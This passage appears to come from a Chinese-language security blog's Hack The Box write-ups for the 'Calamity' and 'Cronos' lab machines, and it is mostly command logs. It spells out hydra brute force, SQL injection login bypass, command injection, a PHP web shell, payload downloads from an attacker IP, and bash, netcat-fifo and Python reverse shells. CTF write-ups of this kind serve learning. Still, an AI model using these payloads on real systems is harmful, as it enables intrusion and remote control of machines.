/admin.php?en_log_id=0&amp;action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.</span><br><span class="xml">+ OSVDB-3092: /admin.php: This might be interesting...</span><br></code></pre></div></td></tr></table></figure><h2 id="find-exp"><a href="#find-exp" class="headerlink" title="find exp"></a>find exp</h2><p>searchsploit EasyNews</p><p><a href="http://10.10.10.27/admin.php">http://10.10.10.27/admin.php</a></p><h2 id="find-password"><a href="#find-password" class="headerlink" title="find password"></a>find password</h2><p>burp + sqlmap</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/admin.php</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="apache"><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.10.10.27</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X<span class="hljs-number">11</span>; Linux x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>; rv:<span class="hljs-number">60</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">60</span>.<span class="hljs-number">0</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">10.10.10.27</span>/admin.php</span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">15</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Connection</span>: close</span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">user</span>=<span class="hljs-number">00</span>&amp;pass=<span class="hljs-number">00</span></span><br></code></pre></div></td></tr></table></figure><p>sqlmap -r 1.req</p><p>sqlmap -r 1.req –risk 3 –level 5</p><ol start="6"><li></li></ol><p>hydra</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Usernames<br>hydra -L top-usernames-shortlist.txt -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span><span class="hljs-number">500</span>-worst-passwords.txt -f <span class="hljs-number">10.10</span>.<span class="hljs-number">10.27</span>  http-post-form <span class="hljs-string">&quot;/admin.php:user=^USER^&amp;pass=^PASS^:HERE&quot;</span><br></code></pre></div></td></tr></table></figure><ol start="7"><li></li></ol><p>wapiti -u <a href="http://10.10.10.27/admin.php">http://10.10.10.27/admin.php</a></p><p>not found any vul</p><ol start="8"><li></li></ol><p>curl -X POST <a href="http://10.10.10.27/admin.php">http://10.10.10.27/admin.php</a> -d “<?php system($_GET['cmd']) ?>“ </p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>Password: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>Username: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pass&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Log in to the powerful administrator page&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- password is:skoupidotenekes--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>准备尝试post能否上传一句话，然后意外发现，源代码中藏着密码。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-21/3.PNG" alt="3"><br>发现图片中用户名和密码颠倒了，burp抓包…em，应该是开发错误。</p><ol start="9"><li></li></ol><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">cd <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/U</span>sernames<br>hydra -L top-usernames-shortlist.txt -p skoupidotenekes -f <span class="hljs-number">10.10</span>.<span class="hljs-number">10.27</span>  http-post-form <span class="hljs-string">&quot;/admin.php:user=^USER^&amp;pass=^PASS^:HERE&quot;</span><br><br>hydra -L cirt-<span class="hljs-keyword">default</span>-usernames.txt -p skoupidotenekes -f <span class="hljs-number">10.10</span>.<span class="hljs-number">10.27</span>  http-post-form <span class="hljs-string">&quot;/admin.php:user=^USER^&amp;pass=^PASS^:HERE&quot;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-21/4.PNG" alt="4"></p><ol start="10"><li><a href="http://10.10.10.27/admin.php?html=">http://10.10.10.27/admin.php?html=</a></li></ol><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">html=<span class="hljs-meta">&lt;?php</span> system(ls) <span class="hljs-meta">?&gt;</span> admin.php bg.png index.html leet.png uploads <br>html=<span class="hljs-meta">&lt;?php</span> system(whoami) <span class="hljs-meta">?&gt;</span>   www-data <br>html=<span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&quot;cat /etc/passwd&quot;</span>) <span class="hljs-meta">?&gt;</span><br>html=<span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&quot;cat /home/xalvas/user.txt&quot;</span>) <span class="hljs-meta">?&gt;</span><br><br>/bin/nc /bin/nc.openbsd     nc不支持-e，于是上传php shell。<br>ls -al /tmp          tmp目录可写不可读<br>d-wx-wx-wx  <span class="hljs-number">10</span> root root  <span class="hljs-number">4096</span> Mar <span class="hljs-number">19</span> <span class="hljs-number">23</span>:<span class="hljs-number">39</span> tmp<br><br>pwd /<span class="hljs-keyword">var</span>/www/html<br><br>/usr/bin/wget http:<span class="hljs-comment">//10.10.14.7/php-reverse-shell.php -P /tmp</span><br><br>html=<span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&quot;ls -al /tmp/shell.php&quot;</span>) <span class="hljs-meta">?&gt;</span><br>chmod a+x /tmp/php-reverse-shell.php<br>html=<span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&quot;php /tmp/php-reverse-shell.php&quot;</span>) <span class="hljs-meta">?&gt;</span><br>获得一个shell<br></code></pre></div></td></tr></table></figure><ol start="11"><li>info</li></ol><p>Linux calamity 4.4.0-81-generic #104-Ubuntu SMP Wed Jun 14 08:15:00 UTC 2017 i686 i686 i686 GNU/Linux</p><p>whereis gcc</p><p>gcc: /usr/bin/gcc /usr/lib/gcc /usr/share/man/man1/gcc.1.gz</p><p>准备上传msf类型exp。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">msfvenom -a x86 --platform Linux -p linux<span class="hljs-regexp">/x86/m</span>eterpreter/reverse_tcp LHOST=<span class="hljs-number">10.10</span>.<span class="hljs-number">14.7</span> LPORT=<span class="hljs-number">6678</span> -f elf -o payload.elf<br><br>本地执行：<br>handler -H <span class="hljs-number">10.10</span>.<span class="hljs-number">14.7</span> -P <span class="hljs-number">6678</span> -p linux<span class="hljs-regexp">/x86/m</span>eterpreter/reverse_tcp<br>python -m SimpleHTTPServer<br><br>远程shell执行：<br>wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.7</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/payload.elf -P /</span>tmp<br>chmod a+x <span class="hljs-regexp">/tmp/</span>payload.elf<br>.<span class="hljs-regexp">/tmp/</span>payload.elf<br><br>[*] Meterpreter session <span class="hljs-number">5</span> opened (<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> -&gt; <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>) at <span class="hljs-number">2019</span>-<span class="hljs-number">03</span>-<span class="hljs-number">20</span> <span class="hljs-number">12</span>:<span class="hljs-number">11</span>:<span class="hljs-number">48</span> +<span class="hljs-number">0800</span><br><br>成功连接，但是一旦连接就会断开<br></code></pre></div></td></tr></table></figure><ol start="12"><li>searchsploit linux 4.4.0</li></ol><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.7</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/43418.c -P /</span>tmp<br>chmod a+x <span class="hljs-regexp">/tmp/</span><span class="hljs-number">43418</span>.c<br>gcc <span class="hljs-number">43418</span>.c -o pwn<br>编译失败<br><br>wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.7</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/pwn -P /</span>tmp<br>chmod a+x <span class="hljs-regexp">/tmp/</span>pwn<br>./pwn<br>二进制格式失败，kali本地编译运行为<span class="hljs-number">64</span>位。<br><br>wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.7</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/44298.c -P /</span>tmp<br>gcc <span class="hljs-number">44298</span>.c -o pwn<br><span class="hljs-number">44298</span>.c<br>编译失败<br></code></pre></div></td></tr></table></figure><ol start="13"><li>ps -ef | grep root</li></ol><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">root      <span class="hljs-number">1049</span>     <span class="hljs-number">1</span>  <span class="hljs-number">0</span> Mar17 ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/lxcfs /</span>var<span class="hljs-regexp">/lib/</span>lxcfs/<br>搜索lxcfs，判断主机可能是一个容器。<br></code></pre></div></td></tr></table></figure><ol start="14"><li>cat /home/xalvas/dontforget.txt</li></ol><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">peda keeps commads history <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> working dir...you should make <span class="hljs-keyword">a</span> dir <span class="hljs-keyword">in</span> /tmp <span class="hljs-keyword">and</span> work <span class="hljs-built_in">from</span> there<br>keep <span class="hljs-keyword">in</span> mind that tmp is <span class="hljs-keyword">not</span> listable,so other users cannot see your <span class="hljs-built_in">files</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">folders</span> (<span class="hljs-keyword">if</span> you dont use extrmely simple names)<br></code></pre></div></td></tr></table></figure><ol start="15"><li>找到一个可写目录/var/tmp，将LinEnum.sh上传到目标机</li></ol><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.7</span>:<span class="hljs-number">8000</span>/LinEnum.sh<br>wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.7</span>:<span class="hljs-number">8000</span>/linux-exploit-suggester.sh<br>chmod a+x linux-exploit-suggester.sh<br>./linux-exploit-suggester.sh<br><br>wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.7</span>:<span class="hljs-number">8000</span>/<span class="hljs-number">40839</span><br>gcc -pthread <span class="hljs-number">40839</span> -o dirty -lcrypt<br><span class="hljs-regexp">/usr/</span>bin/ld:<span class="hljs-number">40839</span>: file format not recognized; treating as linker script<br><span class="hljs-regexp">/usr/</span>bin/ld:<span class="hljs-number">40839</span>:<span class="hljs-number">2</span>: syntax error<br>collect2: error: ld returned <span class="hljs-number">1</span> <span class="hljs-keyword">exit</span> status<br></code></pre></div></td></tr></table></figure><ol start="16"><li></li></ol><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">nc</span> -lnvp <span class="hljs-number">7788</span> &lt; recov.wav<br>Listening <span class="hljs-literal">on</span> [<span class="hljs-number">0.0.0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">7788</span>)<br>Killed<br><br>python -m SimpleHTTPServer<br>python -m SimpleHTTPServer<br>Serving HTTP <span class="hljs-literal">on</span> <span class="hljs-number">0.0.0.0</span> port <span class="hljs-number">8000</span> ...<br>Killed<br></code></pre></div></td></tr></table></figure><p>提权需要绕过进程保护，绕过许多内存保护机制，利用二进制文件。手写exp。</p><p>看了wp也看不懂，溜了溜了。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cronOS（域名查询）</title>
    <link href="/2019/03/16/x/"/>
    <url>/2019/03/16/x/</url>
    
    <content type="html"><![CDATA[<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">22</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.10.13</span>                                     <br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">53</span>/udp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.10.13</span>                                     <br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">80</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.10.13</span>                                     <br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">53</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.10.13</span>  <br><br><span class="hljs-attribute">53</span>/tcp open  domain  ISC BIND <span class="hljs-number">9</span>.<span class="hljs-number">10</span>.<span class="hljs-number">3</span>-P<span class="hljs-number">4</span> (Ubuntu Linux)<br></code></pre></div></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.13</span>/<br><br>nikto -h <span class="hljs-number">10.10</span>.<span class="hljs-number">10.13</span> &gt; nikto.txt<br>gobuster -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.13</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt<br></code></pre></div></td></tr></table></figure><h2 id="domain"><a href="#domain" class="headerlink" title="domain"></a>domain</h2><p>search domain bin</p><p>80web页面除了apache默认配置一无所获，</p><p><code>echo 10.10.10.13 Cronos.htb &gt;&gt; /etc/hosts</code><br>以前遇到过这种情况，目标网站只允许通过域名访问。cronos.htb是猜测的域名。</p><p>访问<a href="http://cronos.htb,成功列出内容./">http://Cronos.htb，成功列出内容。</a></p><ul><li>gobuster -u <a href="http://cronos.htb/">http://Cronos.htb</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</li><li>searchsploit laravel</li></ul><p>找不到attack vector</p><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><h4 id="dns-查询工具"><a href="#dns-查询工具" class="headerlink" title="dns 查询工具"></a>dns 查询工具</h4><p>参考资料：<a href="https://whale3070.github.io/2016/02/02/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E5%8C%BA%E5%9F%9F%E4%BC%A0%E9%80%81/">如何使用区域传送？</a></p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">dig <span class="hljs-title">@server</span> name <span class="hljs-keyword">type</span><br><br>dig <span class="hljs-title">@10</span>.<span class="hljs-number">10.10</span>.<span class="hljs-number">13</span> axfr cronos.htb<br></code></pre></div></td></tr></table></figure><p>axfr是dns记录的类型，<strong>A记录</strong>代表主机记录，域名 &lt;–&gt;IP 映射</p><p>NS记录，给出一个域名，查由哪些域名服务器进行解析。诸如此类。</p><h4 id="dig查询结果"><a href="#dig查询结果" class="headerlink" title="dig查询结果"></a>dig查询结果</h4><figure class="highlight dns"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dns"><span class="hljs-comment">; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Debian &lt;&lt;&gt;&gt; @10.10.10.13 axfr cronos.htb</span><br><span class="hljs-comment">; (1 server found)</span><br><span class="hljs-comment">;; global options: +cmd</span><br>cronos.htb.<span class="hljs-number">604800</span><span class="hljs-keyword">IN</span><span class="hljs-keyword">SOA</span>cronos.htb. admin.cronos.htb. <span class="hljs-number">3 604800</span> <span class="hljs-number">86400 2419200</span> <span class="hljs-number">604800</span><br>cronos.htb.<span class="hljs-number">604800</span><span class="hljs-keyword">IN</span><span class="hljs-keyword">NS</span>ns1.cronos.htb.<br>cronos.htb.<span class="hljs-number">604800</span><span class="hljs-keyword">IN</span><span class="hljs-keyword">A</span><span class="hljs-number">10.10.10.13</span><br>admin.cronos.htb.<span class="hljs-number">604800</span><span class="hljs-keyword">IN</span><span class="hljs-keyword">A</span><span class="hljs-number">10.10.10.13</span><br>ns1.cronos.htb.<span class="hljs-number">604800</span><span class="hljs-keyword">IN</span><span class="hljs-keyword">A</span><span class="hljs-number">10.10.10.13</span><br>www.cronos.htb.<span class="hljs-number">604800</span><span class="hljs-keyword">IN</span><span class="hljs-keyword">A</span><span class="hljs-number">10.10.10.13</span><br>cronos.htb.<span class="hljs-number">604800</span><span class="hljs-keyword">IN</span><span class="hljs-keyword">SOA</span>cronos.htb. admin.cronos.htb. <span class="hljs-number">3 604800</span> <span class="hljs-number">86400 2419200</span> <span class="hljs-number">604800</span><br><span class="hljs-comment">;; Query time: 298 msec</span><br><span class="hljs-comment">;; SERVER: 10.10.10.13#53(10.10.10.13)</span><br><span class="hljs-comment">;; WHEN: Sat Mar 16 11:13:20 +08 2019</span><br><span class="hljs-comment">;; XFR size: 7 records (messages 1, bytes 203)</span><br><br></code></pre></div></td></tr></table></figure><p><code>echo 10.10.10.13 admin.cronos.htb &gt;&gt; /etc/hosts</code></p><p>访问<a href="http://admin.cronos.htb,发现一个登陆表单./">http://admin.cronos.htb，发现一个登陆表单。</a></p><p>burp抓包，发现是明文</p><p>手动尝试一次：Your Login Name or Password is invalid</p><p>sqlmap尝试注入：sqlmap -r 1.req -p username –batch</p><p>sqlmap -r 1.req -p password –batch</p><p>gobuster -u <a href="http://admin.cronos.htb/">http://admin.cronos.htb</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</p><p>wapiti -u <a href="http://admin.cronos.htb/">http://admin.cronos.htb/</a></p><hr><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">echo <span class="hljs-number">10.10</span>.<span class="hljs-number">10.13</span> www<span class="hljs-selector-class">.cronos</span><span class="hljs-selector-class">.htb</span> &gt;&gt; /etc/hosts<br>echo <span class="hljs-number">10.10</span>.<span class="hljs-number">10.13</span> ns1<span class="hljs-selector-class">.cronos</span><span class="hljs-selector-class">.htb</span> &gt;&gt; /etc/hosts<br>ns1<span class="hljs-selector-class">.cronos</span><span class="hljs-selector-class">.htb</span><br>www<span class="hljs-selector-class">.cronos</span>.htb<br></code></pre></div></td></tr></table></figure><p>nothing useful</p><hr><p>admin’ or ‘1’=’1<br>123456</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-16/1.PNG" alt="1"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-16/2.PNG" alt="2"></p><p>到此为止，思路十分清晰，命令执行漏洞。<br>ping -c 1 ip</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-16/3.PNG" alt="3"></p><p><a href="https://whale3070.github.io/training/2017/11/01/kioptrix-level-2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">Kioptrix Level 2（命令执行漏洞）</a></p><h2 id="获得一个shell"><a href="#获得一个shell" class="headerlink" title="获得一个shell"></a>获得一个shell</h2><p>nc为openbsd版本，无-e选项。</p><p>bash无-i选项。</p><p>选择用php-reverse-shell.php</p><p><code>command=ping+-c+1&amp;host=8.8.8.8|chmod +x php-reverse-shell.php</code></p><p>修改<code>command=ping+-c+1&amp;host=8.8.8.8</code>后面的命令。</p><p>bash -i &gt;&amp; /dev/tcp/10.10.14.7/888 0&gt;&amp;1   </p><p>wget <a href="http://10.10.14.7:8000/php-reverse-shell.php">http://10.10.14.7:8000/php-reverse-shell.php</a></p><p>chmod +x php-reverse-shell.php</p><p>./php-reverse-shell.php</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-16/4.PNG" alt="4"></p><p>python -c ‘import pty; pty.spawn(“/bin/bash”)’</p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>kali: <code>nc -lnvp 6677</code><br><code>command=ping+-c+1&amp;host=8.8.8.8|chmod +x php-reverse-shell.php</code><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.7 6677| &gt;/tmp/f</p><p>burp repeater——选中上述命令——ctl+U进行url编码</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-16/6.PNG" alt="6"></p><p>虽然反弹了shell，但是会自动退出</p><h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><p>方便快捷</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lnvp <span class="hljs-number">6677</span><br><br><span class="hljs-attribute">python</span> -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;10.10.14.7&quot;</span>,<span class="hljs-number">6677</span>));os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">0</span>); os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">1</span>); os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></div></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h4 id="内核漏洞提权（failed）"><a href="#内核漏洞提权（failed）" class="headerlink" title="内核漏洞提权（failed）"></a>内核漏洞提权（failed）</h4><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">uname</span> <span class="hljs-string">-a</span><br><span class="hljs-string">Linux</span> <span class="hljs-string">cronos</span> <span class="hljs-number">4.4</span><span class="hljs-number">.0</span><span class="hljs-number">-72</span><span class="hljs-string">-generic</span> <span class="hljs-comment">#93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br><br><span class="hljs-string">searchsploit</span> <span class="hljs-string">linux</span> <span class="hljs-number">4.4</span><span class="hljs-number">.0</span><br><span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">Linux</span> <span class="hljs-string">Kernel</span> <span class="hljs-number">4.4</span><span class="hljs-number">.0</span> <span class="hljs-string">(Ubuntu</span> <span class="hljs-number">14.04</span><span class="hljs-string">/16.04</span> <span class="hljs-string">x86-64)</span> <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;AF_PACKET&#x27;</span> <span class="hljs-string">Race</span> <span class="hljs-string">Condition</span> <span class="hljs-string">Privilege</span> <span class="hljs-string">Escalat</span> <br><span 